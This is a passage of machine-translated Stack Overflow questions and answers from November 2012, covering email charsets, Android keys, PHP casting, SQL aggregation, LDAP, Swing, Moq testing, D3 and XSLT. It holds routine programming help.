            AlternateView alternateHtml = AlternateView.CreateAlternateViewFromString(htmlBody,
                                                                                      new ContentType("text/html"));
            msg.AlternateViews.Add(alternateHtml);

            AlternateView alternateText = AlternateView.CreateAlternateViewFromString(textBody,
                                                                                      new ContentType("text/plain"));
            msg.AlternateViews.Add(alternateText);

        }
        else {
            msg.Body = textBody;
        }

        return msg;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T14:22:24.293

最后，我意识到传递给方法的“htmlTemplate”字符串是`charset=ISO-8859-1`在电子邮件的头部定义的，因此会覆盖我在代码中所做的任何更改。

我将字符集更改为`UTF-8`，并将我的代码恢复为：

```
using (SmtpClient client = GetSmtpClient(settings)) {
  using (MailMessage message = new MailMessage()) {
    message.To.Add(toList);
    message.Subject = subject;
    message.Body = textTemplate;          
    message.AlternateViews.Add(AlternateView.CreateAlternateViewFromString(htmlTemplate, new ContentType("text/html")));
    client.Send(message);
  }
} 
```

并且现在可以发送文本和 html 模板以及解决重音字符问题。

# android - 如何拦截中心按钮按下

> ID：13287804
> 
> 赞同：2
> 
> 时间：2012-11-08T11:05:48.537
> 
> 标签：android

我有一个应用程序，当用户按下 android 设备上的中心按钮时，我必须执行一些代码。我已经通过处理用户按下右手按钮（后退按钮），`onKeyDown(int keyCode, KeyEvent event) / if (keyCode == KeyEvent.KEYCODE_BACK)`所以我假设按下中心按钮将以类似的方式进行处理。但经过进一步调查，似乎没有调用 onKeyDown 。所以我的问题是；如何拦截中心按钮按下？

PS 令我尴尬的是，我什至不知道中心按钮叫什么！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:08:11.593

您**无法拦截**该键（如果您正在谈论主页按钮）它是一个操作系统功能，可将用户带到他的启动器短按，并长按到多任务菜单。

If 也是**[核心应用质量指南](http://developer.android.com/distribute/googleplay/quality/core.html)**。

> UX-N3 在任何时候按下 Home 按钮都会导航到设备的主屏幕。

您可以检测到您的应用程序正在使用[`onStop()`](http://developer.android.com/reference/android/app/Activity.html#onStop%28%29).

在 Android 3.0 之前，可以`onPause()`不点击`onStop()`. 因此，如果您也针对预蜂窝设备，您可能还需要查看该[`onPause()`](http://developer.android.com/reference/android/app/Activity.html#onPause%28%29)事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:14:00.520

您寻找的中心按钮很可能是[`KEYCODE_DPAD_CENTER`](http://developer.android.com/reference/android/view/KeyEvent.html#KEYCODE_DPAD_CENTER)。那个通常位于手机的中心。至少年纪大的有，但已经不常见了。通常也不会出现在桌子上。

对于大多数 UI 元素，该按钮具有单击当前事物的默认行为。因此，对于在您的应用程序中使用 dpad 导航的用户，请尽量不要破坏该功能（并返回 false from `onKey...`）。

# html - 如何以 html 和 css 将画廊居中

> ID：13287811
> 
> 赞同：-2
> 
> 时间：2012-11-08T11:06:28.243
> 
> 标签：html, css

我对 html 和 css 不熟悉，希望有人能提供帮助。

在 w3 学校 ( [http://www.w3schools.com/CSS/css_image_gallery.asp](http://www.w3schools.com/CSS/css_image_gallery.asp) ) 的帮助下，我创建了一个简单的画廊。

有了这个，图像被放在左上角。我想将图像更多地放在页面的中央。

有没有办法轻松做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:07:28.567

将所有内容包装在 id 为 的 div 中`container`。然后将`#container { width: 100px; margin: 0 auto;`100px 替换为您希望画廊的宽度。

# linq - 在 DateField 上的 Linq Lambda 排序

> ID：13287813
> 
> 赞同：0
> 
> 时间：2012-11-08T11:06:33.433
> 
> 标签：linq, lambda

今天，当我使用 Linq + lambda 对列表进行排序时，发生了一些奇怪的事情。我有一个列表，其中包含在字段 c => c.Statistics.Created 上应按 OrderedByDescending 排序的文章。该字段作为日期时间返回。我执行以下操作：

```
newsItems = newsItems.OrderByDescending(c => c.Statistics.Created).ToArray<Item>(); 
```

我知道这个列表将按降序排列，并且这个日期的时间也被监视，因为这只是一个 DateTime 对象。现在奇怪的部分。我将代码调整为如下所示：

```
 newsItems = newsItems.OrderByDescending(c => c.Statistics.Created.Date).ToArray<Item>(); 
```

现在，当我查看列表时，这些项目仍然按照应有的方式排序。当我告诉 Linq 只查看日期时，我不明白为什么列表仍然以正确的方式排序。不知何故，Linq 决定也看看时间。当我将我的应用程序附加到 w3p 进程并观察会发生什么时，我看到 Date 对象上的 Time 实际上是空的，就像我期望的那样。当我告诉 linq 只查看日期时，有人可以解释一下这个列表实际上是如何按时排序的吗？

**已经解决了！**

我已经找到了导致这种奇怪行为发生的原因。这是该列表（从 CMS 中获取）已经以某种方式排序。然后，当我按日期（没有时间）排序时，订单显然是正确的，Linq 在这个日期没有做任何其他事情。

# php - 如何将复选框值获取为整数而不是字符串？

> ID：13287816
> 
> 赞同：-1
> 
> 时间：2012-11-08T11:06:34.903
> 
> 标签：php, html

> **可能重复：**
> [如何在 php 中存储 chechbox 值](https://stackoverflow.com/questions/1642391/how-to-store-chechbox-value-in-php)

这是我的代码：

`<input type="checkbox" name="name[]" value="3" />`

这被传递为：

`array(1) { [0]=> string(1) "3" }`

但我宁愿它是整数。这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:10:58.763

您可以将值转换为

```
$string = '3';
$int = (int) $string;
// or
$int = intval($string);
// or check 
if(is_numeric($string)) {}
if(ctype_digit($string)) {} 
```

更新

```
php > $string = '10000000000000';
php > var_dump($string);
string(14) "10000000000000"
php > var_dump((int)$string);
int(10000000000000)
php > var_dump(intval($string));
int(10000000000000) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:09:07.207

你只会得到字符串，你需要把它转换成整数

您可以使用
`$value = intval('3');`

所以`$value`将有 int 值 3。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T11:10:30.493

如果 value 总是作为字符串的整数，则只需强制转换：

```
$zahl = (int)$value 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T11:14:02.143

数组的值`$_POST`始终是字符串或数组。

可以使用[`intval()`](http://php.net/manual/en/function.intval.php)函数来获取字符串的整数值，如下所示：

```
$int_val = intval($_POST['name'][0]); 
```

或者您可以像这样转换为整数：

```
$int_val = (int) ($_POST['name'][0]); 
```

# jquery - 解析推特 JSON

> ID：13287818
> 
> 赞同：0
> 
> 时间：2012-11-08T11:06:38.833
> 
> 标签：jquery, json, twitter

我正在使用以下代码在 Twitter 的 API 上进行搜索：

```
$.post('lib/themattharris-tmhOAuth-38bd48b/search.php',
       {q:'@something',
       pages:'1'}
)
.done(function(xhr) {
    try 
    {
        var tweets = $.parseJSON(xhr.responseText);
    }
    catch (e)
    {
        showError('Error : '+e.message);
        return;
    }
    if (tweets === null)
    {
        showError('Error : no tweets found');
        return;
    }

    $('#timeline').text(tweets.results[0].text);

})
.fail(function(xhr, textStatus, errorThrown) {
    showError('Error : ' + $.parseJSON(xhr.responseText).error);
})
.always(function() {
    $('#load').removeAttr('disabled');
}); 
```

但“推文”总是`null`。My`search.php`进行搜索并简单地回显结果。我检查了[jsonlint](http://jsonlint.com/)返回的 JSON ，没有发现错误。

有什么线索吗？

**编辑**这里是`search.php`：

```
 require_once 'tmhOAuth.php';
    require_once 'tmhUtilities.php';
    require_once 'secrets.php';
    session_start();

    $tmhOAuth = new tmhOAuth(array(
      'consumer_key'    => $consumerKey,
      'consumer_secret' => $consumerSecret,
      'user_token'      => $_SESSION['access_token']['oauth_token'],
      'user_secret'     => $_SESSION['access_token']['oauth_token_secret']
    ));

    $p['q'] = $_POST['q'];
    $p['pages'] = 1;
    $p['include_entities'] = 'true';

    $pages = intval($p['pages']);
    $results = array();

    $code = $tmhOAuth->request(
      'GET',
      'http://search.twitter.com/search.json',
      $p,
      false
    );

    if ($code !== 200) {
        header("HTTP/1.1 500 Internal Server Error");
        echo $tmhOAuth->response['response'];
        return;
    }     
    else
    {
        echo $tmhOAuth->response['response'];
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:25:56.230

这工作^^;

```
.done(function(myJson) {
    try 
    {
        var tweets = $.parseJSON(myJson);
    } 
```

我以为你应该使用`.responseText`？

**编辑**：“成功回调函数传递返回的数据，这将是 XML 根元素、文本字符串、JavaScript 文件或 JSON 对象，**具体取决于响应的 MIME 类型。** ”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:12:43.343

尝试改变 的范围`tweets`，即

```
 ...
var tweets;

try{...}
catch{...}

if (tweets === null)
{
    // does this work now?
}

etc. 
```

# javascript - 在 AMD 模块中使用条件依赖是个好主意吗？

> ID：13287819
> 
> 赞同：4
> 
> 时间：2012-11-08T11:06:51.887
> 
> 标签：javascript, module, js-amd

我正在考虑使用条件来指定 AMD 模块系统中的模块依赖项。例如，在浏览器上加载 libraryA，在服务器上加载 libraryB。

这可能看起来像这样：

```
define([window?"libraryA":"libraryB"],function(library){
    //do some stuff
}); 
```

这将允许我为 2 个模块构建一个抽象层。但这真的是个好主意吗？这样做有什么缺点吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T12:29:05.577

[这种方法可能会导致构建工具出现问题。](http://requirejs.org/docs/optimization.html)

### 更新：

经过进一步研究，我发现[优化器默认不会读取主 JS 文件中的配置设置。](http://requirejs.org/docs/optimization.html#mainConfigFile)因此，更简洁的解决方案是为客户端和服务器使用不同的[地图配置](http://requirejs.org/docs/api.html#config-map)。

### 原来的：

更安全的方法可能是定义一个使其自身适应环境的模块，从而将所有条件代码保留在模块定义中，并以最可靠的格式保留所有依赖项列表。

```
// dependent module
define(["libraryAB"], function (library) {
    //do some stuff
});

// libraryAB.js dependency module
define([], function () {

    return window ?
        defineLibraryA() :
        defineLibraryB();

}); 
```

您也可以通过定义这种方式来保持`libraryA`和`libraryB`代码分开。`libraryAB`

```
// libraryAB.js dependency module
define(["libraryA", "libraryB"], function (libraryA, libraryB) {

    return window ? libraryA : libraryB;

});

//define libraryA.js and libraryB.js as usual 
```

如果您想避免`libraryA`在服务器或`libraryB`客户端上执行，您可以让这些模块返回函数并在必要时记忆结果。

道德是，将所有非标准代码保存在模块定义中是最安全的，保持依赖列表良好且可预测。

# php - Magento 在非模板文件中获取含税价格

> ID：13287820
> 
> 赞同：6
> 
> 时间：2012-11-08T11:06:51.813
> 
> 标签：php, magento, get

目前，我正在尝试在我的产品提要的 php 文件中获取包含税的产品价格。我现在有这个代码：

```
$_product = Mage::getModel('catalog/product')->load($productId);
$_priceIncludingTax = $this->helper('tax')
                               ->getPrice($_product, $_product->getFinalPrice()); 
```

问题是，因为当然 '$this->' 部分不能从文件中很好地工作。有谁知道我如何才能在这个文件中获得含税价格？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-08T11:24:26.590

您可以使用以下方法在任何文件中获取帮助程序实例：

```
Mage::helper('tax') 
```

您的完整代码是：

```
$_product = Mage::getModel('catalog/product')->load($productId);
$_priceIncludingTax = Mage::helper('tax')
    ->getPrice($_product, $_product->getFinalPrice()); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-05-19T15:26:30.673

谢谢@Alex：

如果产品有FinalPrice特价是该产品的最终价格获得最严重的税基价格：

```
 $_product = Mage::getModel('catalog/product')->load($p->getId());

    $_specialPriceIncTax = Mage::helper('tax')
        ->getPrice($_product, $_product->getFinalPrice());

    $_priceTax = Mage::helper('tax')
        ->getPrice($_product, $_product->getPrice()); 
```

# mysql - sql中以月为底的借方总和

> ID：13287827
> 
> 赞同：0
> 
> 时间：2012-11-08T11:07:13.133
> 
> 标签：mysql, sql, date

我有一个表名收据，scema 如下

```
account_no  date        transaction_type  amount
   s1       2012-7-7    opening           500
   s1       2012-8-13   deposit           1000
   s1       2012-7-17   deposit           400 
```

现在我有以下查询

```
select  month(r.date),
  sum(case when (month(r.date))='7' and r.transaction_type='opening' and r.transaction_type='deposit' then r.amount else '' end )as debit 
from receipt r 
where r.account_no='s1' 
```

但它给我的输出是：

```
month  debit 
7      0 
```

谁能告诉我为什么它给我这个输出？

**编辑**

如果我想放置月份的名称而不是数字，那么该怎么做

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:16:42.570

看起来你想要一个`OR`条件`r.transaction_type='opening' and r.transaction_type='deposit'`而不是`AND`

```
select date_format(r.date, '%M'),
  sum(case when (month(r.date))='7' 
        and (r.transaction_type='opening' 
          or r.transaction_type='deposit') 
      then r.amount else 0 end )as debit 
from receipt r 
where r.account_no='s1' 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/c1c2a/6)

或者您可以使用：

```
select date_format(r.date, '%M'),
  sum(r.amount)
from receipt r
where r.account_no='s1'
  and month(r.date) = 7
  and r.transaction_type in ('opening', 'deposit') 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/c1c2a/8)

如果你想获得`sum()`所有月份的，那么你需要添加一个`group by`：

```
select date_format(r.date, '%M'),
  sum(r.amount)
from receipt r
where r.account_no='s1'
  and r.transaction_type in ('opening', 'deposit')
group by month(r.date); 
```

或者

```
select date_format(r.date, '%M'),
  sum(case when (r.transaction_type='opening' 
        or r.transaction_type='deposit') 
      then r.amount else 0 end )as debit 
from receipt r 
where r.account_no='s1'
group by month(r.date) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/c1c2a/11)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T11:09:26.890

你在说

```
 ...r.transaction_type='opening' and r.transaction_type='deposit' 
```

`r.transactiontype`永远不会**同时**是“开放”和“存款”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:16:41.837

我会将您的查询重写为

```
select month(r.date) as month,
       sum(r.amount) as debit
from receipt r
where r.account_no = 's1'
      and month(r.date) = 7
      and (r.transaction_type = 'opening' or r.transaction_type = 'deposit'); 
```

正如其他人已经指出的那样，将其更改`and`为。`or`

# c# - 在 asp.net c# 中从 ldap 获取名称

> ID：13287830
> 
> 赞同：1
> 
> 时间：2012-11-08T11:07:21.407
> 
> 标签：c#, ldap

我想使用 LDAP 从目录服务器显示与用户提供的名称匹配的所有名称，并将其绑定到网格视图。我能够完成这项任务，而不仅仅是一个名称，我正在获取其他属性，例如 LDAP://CN=Neha Shetty,OU=Users,OU=MUM,OU=Mumbai,OU=India,OU=APAC,OU=bunt, DC=xxx，DC=com。但我只想要Neha Shetty。这是我的代码

```
DirectoryEntry de = new DirectoryEntry("ADConnection");

DirectorySearcher deSearch = new DirectorySearcher(de);

//set the search filter    
deSearch.SearchRoot = de;
String UserName = txt_To.Text;
// deSearch.Filter = "(&(objectCategory=user)(GivenName=*" + UserName + "*))";
deSearch = new DirectorySearcher("(&(objectCategory=user)(Name=*" + UserName + "*))");
//deSearch.SearchScope = SearchScope.Subtree;
string[] arrPropertiesToLoad = { "Surname" };
deSearch.PropertiesToLoad.AddRange(arrPropertiesToLoad);

//  SearchResultCollection sResultColl = deSearch.FindAll();
SearchResultCollection sResultColl;
sResultColl = deSearch.FindAll();

Gridview1.DataSource = sResultColl;
Gridview1.DataBind(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:14:42.620

```
LDAP://CN=Neha Shetty,OU=Users,OU=MUM,OU=Mumbai,OU=India,OU=APAC,OU=bunt,DC=xxx,DC=com 
```

是条目的可分辨名称，并且**始终**在返回至少一个条目的搜索结果中返回。专有名称用作目录中条目的*主键*。

目录没有*属性*，目录有*属性*，这些属性根据*objectClasses*分组到*条目*中；属性是单值的，属性可能是多值的。LDAP 客户端必须指定哪些用户属性应作为搜索请求的参数之一返回。

# java - 我的 JMenu 栏没有显示

> ID：13287835
> 
> 赞同：2
> 
> 时间：2012-11-08T11:07:37.313
> 
> 标签：java, swing, jframe, jmenubar

当我运行我的应用程序时，我的 JMenuBar 没有出现。我怎样才能解决这个问题？？

因此，当我运行 JFrame 时，我需要在顶部看到我的 JMenuBar。

我的布局为**空**

代码：

```
package view;

import java.awt.BorderLayout;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.WindowConstants;

public class Home extends JFrame {

    private Container window = getContentPane();

    public Home(){
        initGUI();  
    }

    public void initGUI(){

        setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);        
        setPreferredSize(new Dimension(800, 600));
        setLayout(null);

        JMenuBar menu = new JMenuBar();
        JMenu file = new JMenu("File");
        menu.add(file);
        window.add(menu);

        pack();

    }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:11:39.663

*   你没有添加`JMenuBar`到`JFrame`

*   利用`setJMenuBar(menu);`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:13:58.533

而不是 add(menu) 调用

*   setJMenuBar(菜单);

你也最好使用 SwingUtilities.invokeLater()

# ios - iPhone 应用程序编程中网络呼叫请求/响应的最佳实践

> ID：13287843
> 
> 赞同：0
> 
> 时间：2012-11-08T11:08:05.430
> 
> 标签：ios, afnetworking

我开发了 3 个 Android 应用程序和 2 个 Iphone 应用程序，因为我来自 Java 背景，所以我获得了使网络/Web 服务调用正确地在不同线程上工作的最佳实践。进行除主线程之外的并行多个调用。

但是，在为几乎 2 个 iphone 应用程序跨 iOS 平台时，我还没有得到哪些是 iOS Web 服务调用模型的最佳实践，因此 UI 不会受到影响。

我使用了 NSURLConnection 及其回调方法。

谁能帮我举个例子？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T11:14:18.023

在任何情况下，我都会评估现有的第 3 方网络框架/库（如使用 java），然后从头开始并自己实现！

例如从[AFNetworking](https://github.com/AFNetworking/AFNetworking)开始。这是最成功的之一，并在后台使用 NSURLConnection 和 NSOperation（以及用于异步请求的 NSOperationQueue）等。

**更新**

[Alamofire](https://github.com/Alamofire)是 AFNetworking 的 Swift 版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:25:24.720

您可以使用 NSURLConnection 类发出请求，[这是链接](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSURLConnection_Class/Reference/Reference.html)

它在我的申请的请求/响应方面帮助了我很多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:52:33.140

在我看来，最佳实践通常是：

*   尽可能使用 NSURLConnection
*   使用 NSURLConnection 时，使用异步 api，通过委托 + 调用“开始”，通常来自主线程
*   使用 NSURLConnection 时，不要使用 sendSynchronousRequest
*   通过使用块和 dispatch_async 或系统中任何其他可用的 APIS 在后台解析任何传入数据以实现并发
*   如果您有一个非常复杂的服务器 API，需要大量繁重的代码来解析等，并且您没有时间使用 NSURLConnection 来实现所有这些，请使用第 3 方框架，如 RestKit

# c# - 从 2 个给定的 IP 地址计算 IP 范围号

> ID：13287853
> 
> 赞同：-2
> 
> 时间：2012-11-08T11:08:38.750
> 
> 标签：c#, pcap.net

我在我的应用程序中使用 pcapdotnet DLL，我添加的选项之一是在发送 pcap 文件之前更改数据包 IP 地址（发送到我的函数 2 ip：旧 IP 地址和我想要更改的新 IP 地址）。

现在我想添加另一个可以更改 IP 地址范围的选项。

例如：

旧 IP 地址为 70.1.2.3，范围为 10.0.0.1 到 212.0.0.0

所以 IP 地址 70.1.2.3 将更改为 10.0.0.1，而 10.0.0.2 将更改为 70.1.2.3，我正在寻找最好的方法。

到目前为止，我只看到这篇没有帮助我的帖子：[有没有简单的方法可以从 2 个给定的 IP 地址计算 IP 数量？](https://stackoverflow.com/questions/9032348/is-there-easy-way-of-calculating-number-of-ips-from-2-given-ip-addresses)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:46:59.883

1.  IPv4 地址由 4 个字节组成，将这 4 个字节组合起来就可以得到一个普通的 32 位数字。[您可以使用您链接的线程](https://stackoverflow.com/a/9032563/69809)中描述的方法轻松获得此号码（我刚刚注意到@DarkSquirrel42 在我插手时已经发布了相同的答案）。我在那个答案中唯一要改变的是返回**一个无符号整数**（`uint`）：

    ```
    public static uint IPToInt(string IP)
    {
         return (uint)IPAddress.NetworkToHostOrder(
             BitConverter.ToInt32(IPAddress.Parse(IP).GetAddressBytes(), 0));
    } 
    ```

2.  一旦你有了它，这是一个简单的数学问题：

    ![将一个 IP 号码范围映射到不同的 IP 号码范围](../Images/6cbb11b1630f6ed27eb9d82ac9b44a75.png)

    请注意，`10.0.0.1`to`212.0.0.0`是一个非常大的范围。如果您映射`10.0.0.1`到`70.1.2.3`，您将在到达之前用完地址空间`212.0.0.0`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T12:17:39.807

“没有帮助”的帖子有你需要的一切：

它向您展示了如何将三点形式的 IPv4 转换为 Int32（因为 IPv4 地址的大小正好是 32 位，所以可以使用）

从那里你可以简单地开始计数

你想要做的看起来像：

将您的 IP 范围转换为 2 个 32 位整数

做一个从一个到另一个的for循环

将循环变量转换回三点形式

可选择检查不应使用的 IP 并跳过它们（在无类别 IP 范围的情况下，您可能希望排除在有类别范围内可能是网络或广播地址的 IP...）

# unit-testing - 单元测试断言针对最终结果或验证参数是否使用 Moq 调用

> ID：13287860
> 
> 赞同：0
> 
> 时间：2012-11-08T11:09:43.647
> 
> 标签：unit-testing, mocking, moq, stubbing

下面是我想要测试的一个类（Class1），但我对我的单元测试并不完全满意。请参阅下面的代码示例。

被测系统

```
public interface IRepository {
    string GetParameter(int id);
}

public class Repository {
    public string GetParameter(int id) {
        return "foo";
    }
}

public class ErrorInfo {
    public string ErrorCodes { get; set; }
}

public interface IErrorProvider {
    ErrorInfo BuildErrorMessage(string errorCodes);
}

public class ErrorProvider {
    public ErrorInfo BuildErrorMessage(string errorCodes) {
        return new ErrorInfo(){ErrorCodes = errorCodes};
    }
}

public class Class1 {
    private readonly IRepository _repository;
    private readonly IErrorProvider _errorProvider;
    public Class1(IRepository repository, IErrorProvider errorProvider) {
        _repository = repository;
        _errorProvider = errorProvider;
    }

    public List<ErrorInfo> GetErrorList(int id) {
        var errorList = new List<ErrorInfo>();
        string paramName = _repository.GetParameter(id);

        if (string.IsNullOrEmpty(paramName)) {
            string errorCodes = string.Format("{0}, {1}", 200, 201);
            var error = _errorProvider.BuildErrorMessage(errorCodes);
            errorList.Add(error);
        }

        return errorList;
    }
} 
```

单元测试

下面的测试通过了，我们检查是否在被测系统中使用了正确的错误代码。

```
[TestMethod]
public void GetErrorList_WhenParameterIsEmpty_ReturnsExpectedErrorCodes2() {
        //Arrange
        var stubRepo = new Mock<IRepository>();
        stubRepo.Setup(x => x.GetParameter(It.IsAny<int>())).Returns(string.Empty);

        var stubErrorMock = new Mock<IErrorProvider>();

        const int id = 5;
        var sut = new Class1(stubRepo.Object, stubErrorMock.Object);

        //Act
        var result = sut.GetErrorList(id);

        //Verify
        string verifiableErrorCodes = "200, 201";
        stubErrorMock.Verify(x => x.BuildErrorMessage(verifiableErrorCodes));
} 
```

但是我更喜欢测试最终结果。例如，我想针对生产代码中使用的错误代码进行断言。以下测试失败，但我想知道您对如何针对被测系统中使用的错误代码进行断言的想法。

```
[TestMethod]
public void GetErrorList_WhenParameterIsEmpty_ReturnsExpectedErrorCodes1() {
        //Arrange
        var stubRepo = new Mock<IRepository>();
        stubRepo.Setup(x => x.GetParameter(It.IsAny<int>())).Returns(string.Empty);

        string expectedErrorCodes = "200, 201";
        var stubErrorRepo = new Mock<IErrorProvider>();
        stubErrorRepo.Setup(e => e.BuildErrorMessage(It.IsAny<string>()));

        const int id = 5;
        var sut = new Class1(stubRepo.Object, stubErrorRepo.Object);

        //Act
        var result = sut.GetErrorList(id);

        //Assert
        Assert.AreEqual(expectedErrorCodes, result.Single().ErrorCodes);
} 
```

测试系统中使用的此错误代码的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:31:07.597

我建议只模拟`IRepository`并使用真实的`IErrorProvider`. 然后你可以打电话`GetErrorList(id)`检查结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T11:56:42.697

没有真正正确或错误的答案，我们决定使用 Assert 测试来测试最终结果。

我采用了 TDD 方法并重新实现/分析如下。

*   从失败的测试开始（为了简化我从测试和 sut 中删除存储库的代码）

//断言测试

```
 [TestMethod]
    public void GetErrorList_WhenParameterIsEmpty_ReturnsExpectedErrorCodes1()
    {
        //Arrange
        const string expectedErrorCodes = "200, 201";
        var stubErrorRepo = new Mock<IErrorProvider>();
        stubErrorRepo.Setup(e => e.BuildErrorMessage(expectedErrorCodes)).Returns(new ErrorInfo() { ErrorCodes = expectedErrorCodes });

        var sut = new Class1(stubErrorRepo.Object);

        //Act
        var result = sut.GetErrorList();

        //Assert
        Assert.AreEqual(expectedErrorCodes, result.Single().ErrorCodes);
    } 
```

//SUT

```
 public IEnumerable<ErrorInfo> GetErrorList(int id)
    {           
        yield return new ErrorInfo();            
    } 
```

如您所料，测试失败。

现在，如果编写*足够的*生产代码以使此测试通过。

```
 public IEnumerable<ErrorInfo> GetErrorList()
    {
        yield return _errorProvider.BuildErrorMessage("200, 201");
    } 
```

对于上述 SUT，VerifyTest 仍然会失败。

//验证测试

```
 [TestMethod]
    public void GetErrorList_WhenParameterIsEmpty_ReturnsExpectedErrorCodes2()
    {
        //Arrange
        var stubErrorMock = new Mock<IErrorProvider>();
        var sut = new Class1(stubErrorMock.Object);

        //Act
        sut.GetErrorList();

        //Verify
        string verifiableErrorCodes = "200, 201";
        stubErrorMock.Verify(x => x.BuildErrorMessage(verifiableErrorCodes));
    } 
```

但是，如果我希望通过此测试，我可以编写以下生产代码，如下所示

```
 public IEnumerable<ErrorInfo> GetErrorList()
    {
        _errorProvider.BuildErrorMessage("200, 201");
        return null;
    } 
```

现在，VerifyTest 通过，但 AssertTest 失败。

两种测试都以各自的方式有效。然而，他们测试不同的语义。AssertTest 测试最终结果是否包含正确的错误代码。验证测试确保使用正确的错误代码调用该方法。需要注意的是，Assert 测试的最终值是基于 Moq 框架提供的设置方法“match”。换句话说，设置决定了最终结果。如果设置配置不正确或生产代码使用与设置配置不匹配的错误代码，AssertTest 将失败。

最好使用 AssertTest 来测试最终结果。

# d3.js - 在 D3.js 中创建元素“在内存中”，就像 jQuery 一样

> ID：13287862
> 
> 赞同：13
> 
> 时间：2012-11-08T11:09:45.863
> 
> 标签：d3.js

而不是做

```
d3.select("body").append("svg") 
```

，大多数 d3.js 示例都这样做，我想创建一个元素，而不是立即将它附加到 body 或任何东西上。

有点像`$('<div/>')`在 jQuery 中。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-09T03:52:08.297

[使用document.createElement()](https://developer.mozilla.org/en-US/docs/DOM/document.createElement)创建元素并`d3`像往常一样传递给它。

在控制台中：

```
> a = document.createElement("div")
<div>​&lt;/div>​
> d3.select(a).append("svg")
[Array[1]]   
> a
<div>​
<svg>​&lt;/svg>​
</div>​ 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2019-06-28T15:11:14.360

```
// create selection containing unattached div node    
var sel = d3.create('svg'); 
```

如果你只想要节点......

```
// retrieve unattached node
var node = d3.create('svg').node(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-01-12T01:27:28.963

要“在内存中”创建 svg 元素，请使用`document.createElementNS`.

**document.createElementNS 的使用：**

```
// Create the svg elem
var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");

// Create a g elem
var g = document.createElementNS("http://www.w3.org/2000/svg", "g");

// Create a d3 Selection with the elem
var d3Svg = d3.select(svg);
var d3g = d3.select(g); 
```

**将 d3 选择附加到另一个 d3 选择：**

```
d3Svg.append(function(){ return d3g.node(); }); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-05-06T16:05:01.907

您应该尝试以下方法：

```
var $svg = $('<svg/>');
var d3svg = d3.select($svg[0]);

// ... manipulate d3svg ...

$('body').append($svg) 
```

希望能帮助到你。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-16T01:59:03.057

为了支持自定义 SVG 元素的百分比宽度，我必须这样做：

```
var svgDom = document.createElementNS("http://www.w3.org/2000/svg", "svg");
svgDom.setAttributeNS("http://www.w3.org/2000/xmlns/", "xmlns:xlink", "http://www.w3.org/1999/xlink");
svg = d3.select(svgDom)
    .attr("class", "chart")
    .attr("width", "100%")
    .attr("height", "100%"); 
```

# xml - 使用 XSLT 将 XML 转换为 CSV - 动态列

> ID：13287865
> 
> 赞同：1
> 
> 时间：2012-11-08T11:09:50.247
> 
> 标签：xml, xslt, csv

我必须将 XML 文件转换为 CSV 文件。输入 XML 文件是这样的：

```
<Person>
    <Name>John</Name>
    <FamilyMembers>
        <FamilyMember>
            <Name>Lisa</Name>
            <Type>Sister</Type>
        </FamilyMember>
        <FamilyMember>
            <Name>Tom</Name>
            <Type>Brother</Type>
        </FamilyMember>
    </FamilyMembers>
</Person>
<Person>
    <Name>Daniel</Name>
    <FamilyMembers>
        <FamilyMember>
            <Name>Peter</Name>
            <Type>Father</Type>
        </FamilyMember>
    </FamilyMembers>
</Person> 
```

最终的 CSV 文件应如下所示：

```
Name;Sister;Brother;Father
John;Lisa;Tom
Daniel;;;Peter 
```

我基本上想要的是每个具有不同内容的“类型”节点的一列。“类型”没有限制。

编辑：我的实际 XSLT 将其解析为 CSV，如下所示：

```
Name;Name;Type
John;Lisa;Sister
John;Tom;Brother
Daniel;Peter;Father 
```

有谁知道如何解决我的问题？

安德烈

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T12:22:48.937

